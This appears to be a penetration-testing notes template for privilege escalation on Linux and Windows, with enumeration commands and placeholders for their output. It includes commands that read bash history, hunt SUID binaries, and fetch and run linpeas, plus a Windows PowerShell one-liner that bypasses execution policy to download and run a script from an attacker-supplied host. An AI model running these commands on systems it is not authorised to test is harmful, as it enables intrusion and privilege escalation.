# Privilege Escalation

## Linux

- **System Info**
    - **Kernel**
        ```bash
        uname -r
        ```
        ```bash
        <insert kernel version here>
        ```
    - **Services**
        ```bash
        ps aux
        ```
        ```bash
        <insert services here>
        ```
    - **Users**
        ```bash
        whoami
        ```
        ```bash
        <insert username here>
        ```

- **History**
    ```bash
    cat ~/.bash_history
    ```
    ```bash
    <insert bash history here>
    ```

- **sudo -l (List Sudo Permissions)**
    ```bash
    sudo -l
    ```
    ```bash
    <insert sudo permissions here>
    ```

- **SUIDs**
    ```bash
    find / -type f -perm /4000 2>/dev/null
    ```
    ```bash
    <insert suid files here>
    ```

- **Cronjobs**
    ```bash
    cat /etc/crontab
    ```
    ```bash
    <insert cronjobs here>
    ```

- **Linpeas**
    ```bash
    wget https://github.com/carlospolop/PEASS-ng/releases/download/2021.02.20/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```
    ```bash
    <insert linpeas output here>
    ```

## Windows

- **Winpeas**
    ```bash
    powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$IP_ADDRESS/winpeas.ps1'))"
    ```
    ```bash
    <insert winpeas output here>
    ```